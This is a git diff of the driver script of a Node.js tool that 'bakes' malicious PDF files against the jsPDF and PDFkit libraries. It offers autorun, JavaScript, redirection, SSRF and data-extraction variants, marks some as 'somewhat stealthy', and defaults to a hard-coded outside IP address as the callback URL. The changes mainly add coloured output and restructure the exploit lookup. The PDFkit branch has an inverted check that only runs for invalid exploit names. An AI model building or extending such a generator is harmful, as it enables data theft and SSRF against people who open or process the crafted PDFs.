@@ -1,5 +1,6 @@
 const { ArgumentParser } = require('argparse');
 const { version } = require('../package.json');
+const chalk = require('chalk');
 
 const parser = new ArgumentParser({
   description: 'Argparse example'
@@ -15,7 +16,7 @@ parser.add_argument('-u', '--uri', { help: 'Specify URI to inject/SSRF'});
 
 
 function list_jsPDF_exploits(){
-	console.log('Avaliable exploits are: \nautorun \nsimple_js \nredirection \nPDFSSRF \nextraction')
+	console.log('Avaliable exploits are: \nautorun \nsimple_js \nredirection \nPDFSSRF (somewhat stealthy) \nextraction (somewhat stealthy)')
 }
 
 
@@ -50,13 +51,13 @@ function checkArgs(myArgs){
 	// program cant run if exploit not defined
 	if (myArgs.exploit == undefined)
 	{
-		console.log("No exploit given, run -l [jsPDF|PDFkit] -L to list out avaliable exploits")
+		console.log(chalk.red("[!] No exploit given, run -l [jsPDF|PDFkit] -L to list out avaliable exploits"))
 		return 0
 	}
 
 	if (myArgs.output == undefined)
 	{
-		console.log("No output file name was given, will use default name")
+		console.log(chalk.magentaBright("[*] No output file name was given, will use default name"))
 	}
 	return 1
 }
@@ -67,45 +68,48 @@ function createExploit(vuln_lib, exploit, outname, direction='http://20.211.25.3
 		const jsPDF_template = require("./jsPDF_template.js");
 		const template_jsPDF = new jsPDF_template;
 		
-		var dict = {}
-		dict['autorun'] = template_jsPDF.bake_autorun; 
-		dict['simple_js'] = template_jsPDF.bake_simple_js;
-		dict['redirection'] = template_jsPDF.bake_redirection;
-		dict['PDFSSRF'] = template_jsPDF.bake_PDFSSRF;
-		dict['extraction'] = template_jsPDF.bake_extraction;
-		// console.log(template_jsPDF)
-		console.log("generating " + exploit);
-		template_status = dict[exploit](outname, direction)
-		if (template_status[1] == 1){
-			console.log("Finished bake " + exploit)
-			return template_status[0]
-		} else {			
-		console.log("Failed to bake" + exploit)
-		return -1
+		var jsPDF_dict = {'autorun': template_jsPDF.bake_autorun,
+		'simple_js': template_jsPDF.bake_simple_js,
+		'redirection': template_jsPDF.bake_redirection,
+		'PDFSSRF': template_jsPDF.bake_PDFSSRF,
+		'extraction': template_jsPDF.bake_extraction}
+		if (jsPDF_dict.hasOwnProperty(exploit)){
+			// console.log(template_jsPDF)
+			console.log("[*] Generating " + exploit + " ....");
+			template_status = jsPDF_dict[exploit](outname, direction)
+			if (template_status[1] == 1){
+				if(template_status.length == 3){
+					return [1, "[+] Finished bake " + chalk.cyan(exploit) + ", saved to " + chalk.cyan(template_status[0]) + "\n\tURL: " + chalk.blue(direction)]	
+				} else {
+					return [1, "[+] Finished bake " + chalk.cyan(exploit) + ", saved to " + chalk.cyan(template_status[0])]			
+				}
+			} else {			
+				return [-1, chalk.red("[-] Failed to bake" + exploit)] 
+			}
+		} else {
+			return [-1, chalk.red("[!] Invalid exploit, run the command node main.js -l jsPDF -L for avaliable exploits")] 
 		}
+		
 		break;
 	case 'PDFkit':
-		console.log("running PDFkit");
+		// console.log("running PDFkit");
 		const PDFkit_template = require("./PDFkit_template.js");
 		const template_PDFkit = new PDFkit_template;
-		var dict = {}
-		dict['js_submitForm'] = template_PDFkit.js_submitForm; 
-		console.log("generating " + exploit);
-		// dict[exploit](outname, direction)
-		template_status = dict[exploit](outname, direction)
-		template_status.then(status => {
-			console.log(status)
+		var PDFkit_dict = {'js_submitForm': template_PDFkit.js_submitForm} 
+		if (!(PDFkit_dict.hasOwnProperty(exploit)) ){
+			console.log("[+] Generating " + exploit + " ....");
+			template_status = PDFkit_dict[exploit](outname, direction)
+			template_status.then(status => {
 			if (status[1] == 1){
-			console.log("Finished bake " + exploit)
-			return status[0]
-		}else {			
-		console.log("Failed to bake" + exploit)
-		return -1
+				return [1, "[+] Finished bake " + chalk.blue(exploit)]
+			}else {			
+				return [-1, chalk.red("[-] Failed to bake" + exploit)] 
+			}
+			})
 		}
-		})
 		break;
 	default:
-		console.log("lol, some error happened")
+		console.log("[!] Some error occured and idk what :(")
 		return -1
 		break;
 	}
@@ -128,13 +132,14 @@ function main(){
 	const direction = myArgs.uri
 
 	const myfile = createExploit(vuln_lib, exploit, outname, direction)
-	if(myfile == -1){
-		console.log("Failed to create file, unable to test")
-		process.exit(-1)
-	} else {
-		console.log("myfile returned with:", myfile)
+	console.log(myfile[1])
+	// if(myfile == -1){
+	// 	console.log("Failed to create file, unable to test")
+	// 	process.exit(-1)
+	// } else {
+	// 	console.log("[+] Successfully created: ", myfile)
 
-	}
+	// }
 }
 
 
